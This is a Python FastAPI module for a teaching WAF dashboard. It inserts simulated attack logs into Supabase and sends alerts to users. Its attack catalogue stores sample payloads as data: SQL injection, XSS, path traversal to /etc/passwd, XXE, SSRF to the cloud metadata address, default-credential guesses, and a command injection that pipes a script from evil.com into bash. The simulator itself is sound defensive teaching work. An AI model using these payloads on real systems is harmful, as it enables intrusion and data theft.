"""
Attack Simulator endpoint
========================
POST /api/simulate/attack  — generate realistic attack log(s) into Supabase
and fire in-app notifications, so a teacher can demo the WAF live from the UI
(no terminal script needed).

Uses the Supabase service key to insert rows (bypasses RLS) and reuses the
alerts fan-out so every user sees the notification in real time.
"""

import os
import random
import urllib.request
import json as _json
from datetime import datetime, timezone

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from .alerts import _notify_all_users, _SEVERITY_TO_TYPE

try:
    from dotenv import load_dotenv, find_dotenv
    load_dotenv(find_dotenv(usecwd=True) or os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", ".env"))
except Exception:
    pass

router = APIRouter(prefix="/api/simulate", tags=["Simulator"])

SUPABASE_URL         = os.getenv("SUPABASE_URL", "").rstrip("/")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY", "")

# ── Attack catalogue (trimmed from attack_examples.py) ──────────────────────
ATTACKS = {
    "SQL Injection": {
        "severity": "Critical", "ai": (0.78, 0.99),
        "paths": ["/login", "/search", "/api/users", "/admin/query"],
        "payloads": ["' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users; --",
                     "' UNION SELECT username, password FROM users --", "admin'--", "' OR 1=1#"],
    },
    "XSS": {
        "severity": "High", "ai": (0.60, 0.92),
        "paths": ["/comment", "/profile", "/search", "/feedback"],
        "payloads": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                     "<svg onload=alert(1)>", "javascript:alert('XSS')", "<body onload=alert('XSS')>"],
    },
    "Command Injection": {
        "severity": "Critical", "ai": (0.82, 0.99),
        "paths": ["/api/ping", "/api/exec", "/tools/scan", "/api/run"],
        "payloads": ["; ls -la", "| cat /etc/passwd", "&& whoami", "`id`", "$(id)",
                     "; curl http://evil.com/shell.sh | bash"],
    },
    "Path Traversal": {
        "severity": "High", "ai": (0.65, 0.93),
        "paths": ["/download", "/file", "/static", "/api/read"],
        "payloads": ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                     "....//....//etc/passwd", "../../../windows/system32/config/sam"],
    },
    "CSRF": {
        "severity": "Medium", "ai": (0.50, 0.80),
        "paths": ["/api/transfer", "/api/change-password", "/api/settings"],
        "payloads": ["<img src='https://target.com/api/change-email?email=attacker@evil.com'>",
                     "Referer: http://evil.com/csrf-page"],
    },
    "XXE": {
        "severity": "High", "ai": (0.68, 0.95),
        "paths": ["/api/xml", "/api/parse", "/upload"],
        "payloads": ["<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"],
    },
    "SSRF": {
        "severity": "High", "ai": (0.70, 0.95),
        "paths": ["/api/fetch", "/api/webhook", "/proxy"],
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin",
                     "file:///etc/passwd"],
    },
    "Brute Force": {
        "severity": "High", "ai": (0.55, 0.88),
        "paths": ["/login", "/admin/login", "/api/auth"],
        "payloads": ["username=admin&password=admin", "username=admin&password=123456",
                     "username=root&password=root"],
    },
    "Normal": {
        "severity": "Low", "ai": (0.01, 0.12),
        "paths": ["/", "/home", "/about", "/api/products", "/contact"],
        "payloads": ["", "q=hello+world", "page=1&limit=10", "id=42"],
    },
}

IPS = ["192.168.1.101", "10.0.0.55", "203.0.113.42", "45.33.32.156",
       "185.220.101.5", "91.108.4.1", "1.2.3.4", "104.16.0.1"]
METHODS = ["GET", "POST", "PUT", "DELETE"]
COUNTRIES = ["IN", "US", "CN", "RU", "BR", "DE", "GB", "NG"]
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "sqlmap/1.7.8", "curl/7.68.0",
               "python-requests/2.28.0", "Nikto/2.1.6", "Hydra v9.4"]
STATUSES = ["Blocked", "Blocked", "Blocked", "Healed", "Flagged"]


class SimulateRequest(BaseModel):
    attack_type: str = "SQL Injection"   # a key of ATTACKS, or "Random"
    count:       int = 1                  # 1..50
    notify:      bool = True              # also fire in-app notifications
    payload:     str | None = None        # override payload (custom / chosen)
    path:        str | None = None        # override target path


def _supabase_insert(table: str, rows: list[dict]) -> None:
    url = f"{SUPABASE_URL}/rest/v1/{table}"
    req = urllib.request.Request(url, data=_json.dumps(rows).encode(), method="POST")
    req.add_header("apikey", SUPABASE_SERVICE_KEY)
    req.add_header("Authorization", f"Bearer {SUPABASE_SERVICE_KEY}")
    req.add_header("Content-Type", "application/json")
    req.add_header("Prefer", "return=minimal")
    urllib.request.urlopen(req, timeout=10)


def _make_row(attack_type: str, payload: str | None = None, path: str | None = None) -> dict:
    spec = ATTACKS[attack_type]
    is_normal = attack_type == "Normal"
    score = round(random.uniform(*spec["ai"]), 2)
    status = "Allowed" if is_normal else random.choice(STATUSES)
    payload = payload if payload else random.choice(spec["payloads"])
    return {
        "source_ip":     random.choice(IPS),
        "attack_type":   attack_type,
        "payload":       payload[:500],
        "path":          path if path else random.choice(spec["paths"]),
        "method":        "GET" if is_normal else random.choice(METHODS),
        "severity":      spec["severity"],
        "status":        status,
        "ai_score":      score,
        "response_code": 403 if status == "Blocked" else 200,
        "bytes_in":      random.randint(64, 8192),
        "country":       random.choice(COUNTRIES),
        "user_agent":    random.choice(USER_AGENTS),
        "timestamp":     datetime.now(timezone.utc).isoformat(),
    }


@router.get("/types")
def list_attack_types():
    """Attack types (with sample payloads + paths) for building the UI."""
    return {
        "types": [
            {
                "name": k,
                "severity": v["severity"],
                "payloads": v["payloads"],
                "paths": v["paths"],
            }
            for k, v in ATTACKS.items()
        ]
    }


@router.post("/attack")
def simulate_attack(req: SimulateRequest):
    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
        raise HTTPException(status_code=503, detail="Supabase not configured on the backend")

    count = max(1, min(req.count, 50))
    pool = [t for t in ATTACKS if t != "Normal"]

    rows, notified_total = [], 0
    for _ in range(count):
        atype = random.choice(pool) if req.attack_type == "Random" else req.attack_type
        if atype not in ATTACKS:
            raise HTTPException(status_code=400, detail=f"Unknown attack type: {atype}")
        # Only apply custom payload/path when a single specific type is fired.
        use_payload = req.payload if (req.attack_type != "Random" and count == 1) else None
        use_path    = req.path if (req.attack_type != "Random" and count == 1) else None
        rows.append(_make_row(atype, use_payload, use_path))

    try:
        _supabase_insert("attack_logs", rows)
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Insert failed: {e}")

    # Fire in-app notifications (one row per attack, typed by severity).
    if req.notify:
        for r in rows:
            if r["attack_type"] == "Normal":
                continue
            ntype = _SEVERITY_TO_TYPE.get(r["severity"], "attack")
            notified_total += _notify_all_users(
                ntype,
                f"{r['severity']} {r['attack_type']} detected",
                f"{r['attack_type']} from {r['source_ip']} on {r['method']} {r['path']} — {r['status']}",
            )

    return {
        "inserted": len(rows),
        "attack_type": req.attack_type,
        "notified_users": notified_total,
        "logs": rows,
    }
